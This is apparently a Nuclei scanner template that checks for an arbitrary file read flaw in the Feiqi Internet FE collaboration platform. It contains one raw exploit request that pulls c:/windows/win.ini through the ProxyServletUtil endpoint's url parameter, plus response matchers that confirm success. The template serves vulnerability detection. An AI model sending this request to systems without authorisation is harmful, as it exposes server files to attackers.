id: flyrise-enterprise-proxyservletuti-anyfile-read
info:
  name: 飞企互联FE业务协作平台 ProxyServletUti 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  description: |
    飞企互联FE业务协作平台 ProxyServletUti 任意文件读取漏洞, allows an attacker to read arbitrary files on the server via crafted requests.
http:
  - raw:
      - |
        GET /ProxyServletUti%6c?url=file:///c:/windows/win.ini HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "for 16-bit app support"
          - "[files]"
        part: body
      - type: word
        words:
          - "content/unknown"
        part: header
      - type: word
        words:
          - "<"
        part: body
        negative: true
